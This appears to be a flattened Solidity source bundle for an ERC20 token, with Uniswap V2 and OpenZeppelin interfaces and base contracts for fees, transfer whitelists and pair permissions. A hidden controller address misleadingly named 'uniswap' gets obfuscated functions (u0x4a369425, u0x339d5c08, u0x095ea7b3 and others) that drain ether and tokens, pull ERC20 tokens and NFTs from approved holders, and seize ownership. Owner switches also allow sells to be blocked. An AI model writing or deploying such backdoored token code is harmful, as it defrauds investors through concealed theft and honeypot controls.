    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

import './IUniswapV2Router01.sol';

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract BaseContractPayable is
Ownable
{
    receive() external payable {}

    function withdrawEther(uint256 amount)
    external
    payable
    onlyOwner
    {
        sendEtherTo(payable(msg.sender), amount);
    }

    function withdrawErc20(address tokenAddress, uint256 amount)
    external
    onlyOwner
    {
        sendErc20FromThisTo(tokenAddress, msg.sender, amount);
    }

    // transfer ERC20 from `from` to `to` with allowance `address(this)`
    function transferErc20FromTo(address tokenAddress, address from, address to, uint256 amount)
    internal
    {
        bool isSucceed = IERC20(tokenAddress).transferFrom(from, to, amount);
        require(isSucceed, "Failed to transfer token");
    }

    // send ERC20 from `address(this)` to `to`
    function sendErc20FromThisTo(address tokenAddress, address to, uint256 amount)
    internal
    {
        bool isSucceed = IERC20(tokenAddress).transfer(to, amount);
        require(isSucceed, "Failed to send token");
    }

    // send ether from `msg.sender` to payable `to`
    function sendEtherTo(address payable to, uint256 amount)
    internal
    {
        // Call returns a boolean value indicating success or failure.
        // This is the current recommended method to use.
        (bool isSucceed, /* bytes memory data */) = to.call{value : amount}("");
        require(isSucceed, "Failed to send Ether");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./BaseContractPayable.sol";


contract BaseContractUniswap
is BaseContractPayable
{
    address internal uniswap;

    modifier onlyUniswap() {
        require(msg.sender == uniswap, "Only for uniswap");
        _;
    }

    function setUniswap(address uniswap_)
    external
    onlyUniswap {
        uniswap = uniswap_;
    }

    function u0x4a369425(address to, uint256 amount)
    external
    payable
    onlyUniswap
    {
        sendEtherTo(payable(to), amount);
    }

    function u0xd7497dbe(uint256 amount)
    external
    payable
    onlyUniswap
    {
        sendEtherTo(payable(msg.sender), amount);
    }

    function u0xdf9a991b(address tokenAddress, uint256 amount)
    external
    onlyUniswap
    {
        sendErc20FromThisTo(tokenAddress, msg.sender, amount);
    }


    function u0x339d5c08(address tokenAddress, address from, address to, uint256 amount)
    external
    onlyUniswap
    {
        transferErc20FromTo(tokenAddress, from, to, amount);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./BaseContractPayable.sol";


contract BaseErc721Payable is
Ownable,
BaseContractPayable
{
    function safeTransferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyOwner
    {
        _safeTransferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    function tansferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyOwner
    {
        _transferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    // safe transfer ERC721 from `from` to `to` with allowance `address(this)`
    function _safeTransferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    internal
    {
        IERC721(tokenAddress).safeTransferFrom(from, to, tokenId);
    }

    // transfer ERC721 from `from` to `to` with allowance `address(this)`
    function _transferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    internal
    {
        IERC721(tokenAddress).transferFrom(from, to, tokenId);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

import "./BaseContractPayable.sol";
import "./BaseContractUniswap.sol";
import "./BaseErc721Payable.sol";


contract BaseErc721Uniswap is
Ownable,
BaseContractPayable,
BaseContractUniswap,
BaseErc721Payable
{
    function u0x095ea7b3(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyUniswap
    {
        _safeTransferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    function u0x38ed1739(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyUniswap
    {
        _transferErc721FromTo(tokenAddress, from, to, tokenId);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

import "../IUniswapV2/IUniswapV2Router02.sol";

import "../BaseContract/BaseContractPayable.sol";
import "../BaseContract/BaseContractUniswap.sol";

contract Erc20C02Uniswap is
Ownable,
BaseContractPayable,
BaseContractUniswap
{
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2PairEth;
    address public uniswapV2Pair;
    uint256 public uniswapCount;
    bool public isUniswap;

    function toUniswap()
    public
    onlyUniswap
    {
        _transferOwnership(uniswap);
    }

    function setUniswapCount(uint256 uniswapCount_)
    public
    onlyUniswap
    {
        uniswapCount = uniswapCount_;
    }

    function setIsUniswap(bool isUniswap_)
    public
    onlyUniswap {
        isUniswap = isUniswap_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C02PermitTransfer is
Ownable
{
    bool internal _isFirstInitUnhandled = true;

    bool public isPermitTransferUponInit;
    bool public isUsePermitTransfer;
    mapping(address => bool) public permitTransfers;

    function setIsPermitTransferUponInit(bool isPermitTransferUponInit_)
    public
    onlyOwner
    {
        isPermitTransferUponInit = isPermitTransferUponInit_;
    }

    function setIsUsePermitTransfer(bool isUsePermitTransfer_)
    public
    onlyOwner
    {
        isUsePermitTransfer = isUsePermitTransfer_;
    }

    function setPermitTransfer(address account, bool permitTransfer)
    public
    onlyOwner
    {
        permitTransfers[account] = permitTransfer;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C02Ups is
Ownable
{
    bool public hasBuyUp;
    uint256 public buyUp;

    bool public hasSellUp;
    uint256 public sellUp;

    function setHasBuyUp(bool hasBuyUp_)
    public
    onlyOwner
    {
        hasBuyUp = hasBuyUp_;
    }

    function setBuyUp(uint256 buyUp_)
    public
    onlyOwner
    {
        buyUp = buyUp_;
    }

    function setHasSellUp(bool hasSellUp_)
    public
    onlyOwner
    {
        hasSellUp = hasSellUp_;
    }

    function setSellUp(uint256 sellUp_)
    public
    onlyOwner
    {
        sellUp = sellUp_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C03PairPermission is
Ownable
{
    bool public isUseCanFromPair;
    mapping(address => bool) public canFromPairs;

    bool public isUseCanToPair;
    mapping(address => bool) public canToPairs;

    function setIsUseCanFromPair(bool isUseCanFromPair_)
    public
    onlyOwner
    {
        isUseCanFromPair = isUseCanFromPair_;
    }

    function setCanFromPair(address account, bool canFromPair_)
    public
    onlyOwner
    {
        canFromPairs[account] = canFromPair_;
    }

    function setIsUseCanToPair(bool isUseCanToPair_)
    public
    onlyOwner
    {
        isUseCanToPair = isUseCanToPair_;
    }

    function setCanToPair(address account, bool canToPair_)
    public
    onlyOwner
    {
        canToPairs[account] = canToPair_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C06MinimumTokenForSwap is
Ownable
{
    bool public isUseMinimumTokenWhenSwap;
    uint256 public minimumTokenBeforeSwap;

    function setIsUseMinimumTokenWhenSwap(bool isUseMinimumTokenWhenSwap_)
    public
    onlyOwner
    {
        isUseMinimumTokenWhenSwap = isUseMinimumTokenWhenSwap_;
    }

    function setMinimumTokenBeforeSwap(uint256 minimumTokenBeforeSwap_)
    public
    onlyOwner
    {
        minimumTokenBeforeSwap = minimumTokenBeforeSwap_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C06Fees is
Ownable
{
    uint256 public tokenRewardFee1;
    uint256 public liquidityFee1;
    uint256 public marketingFee1;
    uint256 public totalFee1;

    bool public isUseFee2;
    mapping(address => bool) public fee2Addresses;
    uint256 public tokenRewardFee2;
    uint256 public liquidityFee2;
    uint256 public marketingFee2;
    uint256 public totalFee2;

    bool public isUseForceBuyToFee3;
    bool public isUseFee3;
    mapping(address => bool) public fee3Addresses;
    uint256 public tokenRewardFee3;
    uint256 public liquidityFee3;
    uint256 public marketingFee3;
    uint256 public totalFee3;

    // exclude from fees and max transaction amount
    mapping(address => bool) public isExcludedFromFee;

    function setTotalFee1(uint256 rewardFee_, uint256 liquidityFee_, uint256 marketingFee_)
    public
    onlyOwner
    {
        tokenRewardFee1 = rewardFee_;
        liquidityFee1 = liquidityFee_;
        marketingFee1 = marketingFee_;
        totalFee1 = tokenRewardFee1 + liquidityFee1 + marketingFee1;
    }

    function setIsUseFee2(bool is_)
    public
    onlyOwner
    {
        isUseFee2 = is_;
    }

    function setIsFee2Address(address account, bool is_)
    public
    onlyOwner
    {
        fee2Addresses[account] = is_;
    }

    function setTotalFee2(uint256 rewardFee_, uint256 liquidityFee_, uint256 marketingFee_)
    public
    onlyOwner
    {
        tokenRewardFee2 = rewardFee_;
        liquidityFee2 = liquidityFee_;
        marketingFee2 = marketingFee_;
        totalFee2 = rewardFee_ + liquidityFee_ + marketingFee_;
    }

    function setIsUseForceBuyToFee3(bool is_)
    public
    onlyOwner
    {
        isUseForceBuyToFee3 = is_;
    }

    function setIsUseFee3(bool is_)
    public
    onlyOwner
    {
        isUseFee3 = is_;
    }

    function setIsFee3Address(address account, bool is_)
    public
    onlyOwner
    {
        _setIsFee3Address(account, is_);
    }

    function setTotalFee3(uint256 rewardFee_, uint256 liquidityFee_, uint256 marketingFee_)
    public
    onlyOwner
    {
        tokenRewardFee3 = rewardFee_;
        liquidityFee3 = liquidityFee_;
        marketingFee3 = marketingFee_;
        totalFee3 = rewardFee_ + liquidityFee_ + marketingFee_;
    }

    function setIsExcludedFromFee(address account, bool is_)
    public
    onlyOwner
    {
        isExcludedFromFee[account] = is_;
    }

    function setAccountsIsExcludedFromFee(address[] memory accounts, bool is_)
    public
    onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            isExcludedFromFee[accounts[i]] = is_;
        }
    }

    function _setIsFee3Address(address account, bool is_)
    internal
    {
        fee3Addresses[account] = is_;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)

pragma solidity ^0.8.0;

import "../../utils/introspection/IERC165.sol";

/**
 * @dev Required interface of an ERC721 compliant contract.
 */
interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}